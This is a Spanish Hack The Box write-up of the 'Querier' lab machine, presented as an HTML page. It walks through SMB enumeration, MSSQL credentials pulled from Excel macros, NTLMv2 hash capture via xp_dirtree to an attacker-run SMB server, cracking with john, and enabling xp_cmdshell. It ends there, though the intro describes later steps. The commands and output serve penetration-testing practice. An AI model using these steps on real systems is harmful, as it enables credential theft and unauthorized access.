@@ -1,0 +1,639 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>HackTheBox - Querier (medium) · MiguelRega7</title>
+<meta name="description" content="En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Exce"><meta name="theme-color" content="#070a0f">
+<link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/style.css">
+</head>
+<body>
+<header class="header"><div class="nav wrap">
+<a class="brand" href="/" aria-label="MiguelRega7">MR<em>7</em></a>
+<nav class="links"><a class="nav-link" data-nav="home" href="/">INICIO</a><a class="nav-link" data-nav="writeups" href="/#writeups">WRITEUPS</a><a class="nav-link" data-nav="about" href="/about/">ABOUT</a></nav>
+<div class="socials">
+<a href="https://github.com/MikeRega7" target="_blank" rel="noreferrer" aria-label="GitHub"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M12 .7a11.5 11.5 0 0 0-3.64 22.4c.58.1.79-.25.79-.56v-2.04c-3.2.7-3.87-1.35-3.87-1.35-.52-1.32-1.27-1.67-1.27-1.67-1.04-.71.08-.7.08-.7 1.15.08 1.75 1.18 1.75 1.18 1.02 1.74 2.67 1.24 3.32.95.1-.74.4-1.24.72-1.53-2.55-.29-5.24-1.28-5.24-5.7 0-1.26.45-2.29 1.18-3.1-.12-.3-.51-1.46.11-3.05 0 0 .96-.31 3.15 1.18a10.9 10.9 0 0 1 5.73 0c2.19-1.49 3.15-1.18 3.15-1.18.62 1.59.23 2.75.11 3.05.74.81 1.18 1.84 1.18 3.1 0 4.43-2.7 5.4-5.26 5.69.41.35.77 1.04.77 2.1v3.07c0 .31.21.67.8.55A11.5 11.5 0 0 0 12 .7Z"/></svg></a>
+<a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278" target="_blank" rel="noreferrer" aria-label="LinkedIn"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="currentColor" d="M5.2 3.2A2.2 2.2 0 1 1 5.2 7.6a2.2 2.2 0 0 1 0-4.4ZM3.4 8.9h3.6V20H3.4V8.9Zm5.8 0h3.4v1.52h.05c.47-.9 1.62-1.84 3.34-1.84 3.57 0 4.23 2.35 4.23 5.4V20h-3.55v-5.34c0-1.27-.02-2.91-1.77-2.91-1.78 0-2.05 1.39-2.05 2.82V20H9.2V8.9Z"/></svg></a>
+<a href="https://www.instagram.com/_miguelitornuno7" target="_blank" rel="noreferrer" aria-label="Instagram"><svg viewBox="0 0 24 24" aria-hidden="true"><path fill="none" stroke="currentColor" stroke-width="1.8" d="M7 2.9h10A4.1 4.1 0 0 1 21.1 7v10a4.1 4.1 0 0 1-4.1 4.1H7A4.1 4.1 0 0 1 2.9 17V7A4.1 4.1 0 0 1 7 2.9Z"/><circle cx="12" cy="12" r="3.3" fill="none" stroke="currentColor" stroke-width="1.8"/><circle cx="17.5" cy="6.7" r=".9" fill="currentColor"/></svg></a>
+
+</div><button class="menu" type="button" aria-label="Abrir menú" aria-expanded="false">☰</button>
+</div></header>
+<main class="wrap"><header class="article-head"><a class="back" href="/#writeups">← VOLVER A WRITEUPS</a><div class="article-head-row"><div><span class="article-tag">Hack The Box</span><h1>HackTheBox - Querier (medium)</h1><div class="meta"><span>◷</span><time>2024-04-09</time><span>·</span><span>WRITEUP</span><span>·</span><span>MR7 LAB</span></div></div><div class="share"><span>Compartir</span><button type="button" class="share-btn" data-copy-url="true">↗</button></div></div><p class="article-excerpt">En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Exce.</p></header><div class="article-layout"><aside class="aside"><div class="aside-title">CONTENIDO</div><a href="#portscan">PortScan</a><a href="#enumeraci-n">Enumeración</a><a href="#shell-as-mssql-svc">Shell as mssql-svc</a><a href="#user-flag">User flag</a><a href="#escalada-de-privilegios">Escalada de Privilegios</a><a href="#root-flag">root flag</a><a href="#explotando-el-setimpersonateprivilege">Explotando el SetImpersonatePrivilege</a><a href="#dumpeando-los-hashes-ntlm-almacenados-en-la-sam">Dumpeando los hashes NTLM almacenados en la SAM</a></aside><article class="article-content" id="top"><p align="center">
+<img src="https://labs.hackthebox.com/storage/avatars/9fe0cda48876d1e8772de183c9546f78.png">
+</p>
+
+<p>En este post vamos a estar haciendo la maquina Querier de la plataforma de Hack The Box mediante la enumeración de un recurso compartido por smb vamos a descargador un archivo Excel en la cual mediante marcos encontraremos una función que contiene credenciales para conectarnos al servicio MSSQL que esta corriendo en la maquina ya dentro abusaremos del xp_dirtree para hacer una petición a nuestro recurso compartido y capturar el has ntlmv2 de un usuario que vamos a crackear para conectarnos de nuevo al servicio MSSQL y abusar del xp_cmdshell y obtener una reverse shell para la escalada de privilegios vamos a usar el gpp-decrypt para obtener la contraseña en texto plano que es del administrador y como extra explotaremos el SeImpersonatePrivilege.</p>
+<h2 id="portscan">PortScan</h2>
+<ul>
+<li>Comenzamos con el escaneo de los puertos abiertos por el protocolo <strong>TCP</strong> y también escaneamos sus servicios que corren en los puertos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap sudo nmap -sCV -p135,139,445,1433,5985,47001,49664,49665,49666,49667,49668,49669,49670,49671 10.129.67.247 -oN targeted
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-05 12:44 CST
+Nmap scan report for 10.129.67.247
+Host is up (0.084s latency).
+
+PORT      STATE SERVICE       VERSION
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+445/tcp   open  microsoft-ds?
+1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
+| ms-sql-ntlm-info:
+|   10.129.67.247:1433:
+|     Target_Name: HTB
+|     NetBIOS_Domain_Name: HTB
+|     NetBIOS_Computer_Name: QUERIER
+|     DNS_Domain_Name: HTB.LOCAL
+|     DNS_Computer_Name: QUERIER.HTB.LOCAL
+|     DNS_Tree_Name: HTB.LOCAL
+|_    Product_Version: 10.0.17763
+| ms-sql-info:
+|   10.129.67.247:1433:
+|     Version:
+|       name: Microsoft SQL Server 2017 RTM
+|       number: 14.00.1000.00
+|       Product: Microsoft SQL Server 2017
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+| Not valid before: 2024-04-05T18:40:54
+|_Not valid after:  2054-04-05T18:40:54
+|_ssl-date: 2024-04-05T18:45:35+00:00; -1s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+49671/tcp open  msrpc         Microsoft Windows RPC
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled but not required
+| smb2-time:
+|   date: 2024-04-05T18:45:27
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+</code></pre></div></div>
+<h2 id="enumeraci-n">Enumeración</h2>
+<ul>
+<li>Vemos propiedades de la maquina y el dominio al cual pertenece que es <code>HTB.LOCAL</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap crackmapexec smb 10.129.67.247
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
+</code></pre></div></div>
+<ul>
+<li>Si listamos recursos compartidos por <strong>SMB</strong> vemos que no obtenemos nada.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap crackmapexec smb 10.129.67.247 --shares
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [-] Error enumerating shares: STATUS_USER_SESSION_DELETED
+➜  nmap crackmapexec smb 10.129.67.247 -u 'miguelito' -p '' --shares
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [-] Connection Error: The NETBIOS connection with the remote host timed out.
+</code></pre></div></div>
+<ul>
+<li>Sin embargo si lo hacemos con la herramienta <code>smbclient</code> vemos que si nos muestra los típicos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap smbclient -L 10.129.67.247 -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	Reports         Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.129.67.247 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+</code></pre></div></div>
+<ul>
+<li>Vamos a cuales si tenemos capacidad de lectura o escritura.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap smbmap -H 10.129.67.247 -u 'null'
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	Reports                                           	READ ONLY	
+</code></pre></div></div>
+<ul>
+<li>Tenemos capacidad de lectura al recurso <code>Reports</code> vamos a enumerar lo que esta adentro.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap smbmap -H 10.129.67.247 -u 'null' -r Reports
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+ -----------------------------------------------------------------------------
+     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[*] Detected 1 hosts serving SMB
+[*] Established 1 SMB session(s)
+
+[+] IP: 10.129.67.247:445	Name: 10.129.67.247       	Status: Authenticated
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	Reports                                           	READ ONLY	
+	./Reports
+	dr--r--r--                0 Mon Jan 28 17:26:31 2019	.
+	dr--r--r--                0 Mon Jan 28 17:26:31 2019	..
+	fr--r--r--            12229 Mon Jan 28 17:26:31 2019	Currency Volume Report.xlsm
+</code></pre></div></div>
+<ul>
+<li>Y bueno tenemos un <code>.xlsm</code>.</li>
+</ul>
+<blockquote>
+<p>El formato de archivo XLSM es parte de la aplicación de hoja de cálculo de Microsoft Excel. Es un formato de archivo de libro de trabajo habilitado para macros que permite a los usuarios almacenar y compartir macros y datos de hojas de cálculo.</p>
+</blockquote>
+<ul>
+<li>Vamos a emplear <code>smbclient</code> para conectarnos y descargarlo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  nmap smbclient //10.129.67.247/Reports -N
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Mon Jan 28 17:23:48 2019
+  ..                                  D        0  Mon Jan 28 17:23:48 2019
+  Currency Volume Report.xlsm         A    12229  Sun Jan 27 16:21:34 2019
+
+		5158399 blocks of size 4096. 850432 blocks available
+smb: \&gt; get &quot;Currency Volume Report.xlsm&quot;
+getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (33.1 KiloBytes/sec) (average 33.1 KiloBytes/sec)
+smb: \&gt;
+</code></pre></div></div>
+<ul>
+<li><p>Vamos abrirlo con <code>libreoffice</code>.</p>
+</li>
+<li><p>De primeras no vemos nada.</p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/querier/1.png">
+</p>
+
+<ul>
+<li><p>Pero podemos ver las macros <a href="https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos">https://www.xataka.com/basics/macros-excel-que-como-funcionan-como-crearlos</a> yéndonos al apartado <code>Tools</code> y Macros.</p>
+</li>
+<li><p>Podemos ver básicamente una función que se llama <code>Connect().</code></p>
+</li>
+</ul>
+<p align="center">
+<img src="/assets/hackthebox/img/machines/medium/querier/2.png">
+</p>
+
+<ul>
+<li>Se conecta a una base de datos <code>SQL Server</code> y nos comparten credenciales además de leer el contenido de la tabla <code>volume</code>.</li>
+</ul>
+<table>
+<thead>
+<tr>
+  <th>Usuario</th>
+  <th>Contraseña</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+  <td>reporting</td>
+  <td>PcwTWTHRwryjc$c6</td>
+</tr>
+</tbody>
+</table>
+<h2 id="shell-as-mssql-svc">Shell as mssql-svc</h2>
+<ul>
+<li>Vamos a validar con <code>crackmapexec</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6'
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [-] HTB.LOCAL\reporting:PcwTWTHRwryjc$c6 STATUS_NO_LOGON_SERVERS
+</code></pre></div></div>
+<ul>
+<li>Bueno si probamos haciéndolo a nivel de <code>WORKGROUP</code> o autenticación local si nos funciona.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6' --local-auth
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [+] QUERIER\reporting:PcwTWTHRwryjc$c6
+➜  content crackmapexec smb 10.129.67.247 -u reporting -p 'PcwTWTHRwryjc$c6' -d WORKGROUP
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:WORKGROUP) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [+] WORKGROUP\reporting:PcwTWTHRwryjc$c6
+</code></pre></div></div>
+<ul>
+<li>Bueno lo que vamos hacer es que como tenemos el puerto <code>1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM</code> abierto nos vamos a conectar al servicio.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content impacket-mssqlclient WORKGROUP/reporting@10.129.67.247 -windows-auth
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL (QUERIER\reporting  reporting@volume)&gt;
+</code></pre></div></div>
+<ul>
+<li>No podemos usar <code>xp_cmdshell</code> para ejecutar comandos y tampoco podemos activarlo por que no tenemos permisos.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\reporting  reporting@volume)&gt; xp_cmdshell &quot;whoami&quot;
+[-] ERROR(QUERIER): Line 1: The EXECUTE permission was denied on the object 'xp_cmdshell', database 'mssqlsystemresource', schema 'sys'.
+SQL (QUERIER\reporting  reporting@volume)&gt; enable xp_cmdshell
+[-] ERROR(QUERIER): Line 1: Incorrect syntax near 'xp_cmdshell'.
+SQL (QUERIER\reporting  reporting@volume)&gt; enable_xp_cmdshell
+[-] ERROR(QUERIER): Line 105: User does not have permission to perform this action.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+[-] ERROR(QUERIER): Line 62: The configuration option 'xp_cmdshell' does not exist, or it may be an advanced option.
+[-] ERROR(QUERIER): Line 1: You do not have permission to run the RECONFIGURE statement.
+</code></pre></div></div>
+<ul>
+<li>Lo que podemos hacer es roba el hash <code>NTLMv2</code> en el proceso de la autenticación abusando del <code>xp_dirtree</code> ya que nos permite listar recursos compartidos a nivel de red de algún servidor y nosotros desde nuestra maquina de atacante con <code>smbserver</code> vamos a crear un recurso a nivel de red para que se autentique y capturar el hash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  Downloads impacket-smbserver b $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+</code></pre></div></div>
+<ul>
+<li>Ahora si usamos <code>xp_dirtree</code> para listar los recursos compartidos por detrás viaja la autenticación y capturaremos el hash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\reporting  reporting@volume)&gt; xp_dirtree \\10.10.15.11\smbserver
+subdirectory   depth   file
+------------   -----   ----
+SQL (QUERIER\reporting  reporting@volume)&gt;
+</code></pre></div></div>
+<ul>
+<li>Capturamos el hash.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  Downloads impacket-smbserver b $(pwd) -smb2support
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Config file parsed
+[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+[*] Config file parsed
+[*] Config file parsed
+[*] Config file parsed
+[*] Incoming connection (10.129.67.247,49675)
+[*] AUTHENTICATE_MESSAGE (QUERIER\mssql-svc,QUERIER)
+[*] User QUERIER\mssql-svc authenticated successfully
+[*] mssql-svc::QUERIER:aaaaaaaaaaaaaaaa:254a4df4a95e2690a16c8afd14b68f0a:01010000000000008088a8e09187da0102326448f746e93a00000000010010004d007500590056006700510047004600030010004d00750059005600670051004700460002001000530075006f0053006b006d007900540004001000530075006f0053006b006d0079005400070008008088a8e09187da0106000400020000000800300030000000000000000000000000300000b8458b27b9ac92b92824508e47e300b1dd167c58ec5b12b4846757d2eb899f100a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310035002e0031003100000000000000000000000000
+[*] Connecting Share(1:IPC$)
+[-] SMB2_TREE_CONNECT not found smbserver
+[-] SMB2_TREE_CONNECT not found smbserver
+[*] AUTHENTICATE_MESSAGE (\,QUERIER)
+[*] User QUERIER\ authenticated successfully
+[*] :::00::aaaaaaaaaaaaaaaa
+[*] Disconnecting Share(1:IPC$)
+[*] Closing down connection (10.129.67.247,49675)
+[*] Remaining connections []
+</code></pre></div></div>
+<ul>
+<li>Ahora vamos a crackear el hash para ver la contraseña en texto plano.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content john -w:/usr/share/wordlists/rockyou.txt hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+corporate568     (mssql-svc)
+1g 0:00:00:42 DONE (2024-04-05 13:48) 0.02369g/s 212247p/s 212247c/s 212247C/s correforenz..corococo
+Use the &quot;--show --format=netntlmv2&quot; options to display all of the cracked passwords reliably
+Session completed.
+</code></pre></div></div>
+<ul>
+<li>Vamos a validar que la contraseña es valida.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content crackmapexec smb 10.129.67.247 -u 'mssql-svc' -p 'corporate568' --local-auth
+SMB         10.129.67.247   445    QUERIER          [*] Windows 10.0 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
+SMB         10.129.67.247   445    QUERIER          [+] QUERIER\mssql-svc:corporate568
+</code></pre></div></div>
+<ul>
+<li>Como el usuario se llama <code>mssql-svc</code> nos podemos conectar a <code>mssql</code> también.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">➜  content impacket-mssqlclient WORKGROUP/mssql-svc@10.129.67.247 -windows-auth
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(QUERIER): Line 1: Changed database context to 'master'.
+[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232)
+[!] Press help for extra shell commands
+SQL (QUERIER\mssql-svc  dbo@master)&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora simplemente tenemos que habilitarlo para poder usar el <code>xp_cmdshell</code>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\mssql-svc  dbo@master)&gt; xp_cmdshell &quot;whoami&quot;
+[-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure 'sys.xp_cmdshell' of component 'xp_cmdshell' because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of 'xp_cmdshell' by using sp_configure. For more information about enabling 'xp_cmdshell', search for 'xp_cmdshell' in SQL Server Books Online.
+</code></pre></div></div>
+<ul>
+<li>Vemos que ahora cambia a 1 ya podemos usarlo.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">SQL (QUERIER\mssql-svc  dbo@master)&gt; enable_xp_cmdshell
+[*] INFO(QUERIER): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(QUERIER): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (QUERIER\mssql-svc  dbo@master)&gt;
+</code></pre></div></div>
+<ul>
+<li>Ahora ya podemos ejecutar comandos.</li>
+</ul>
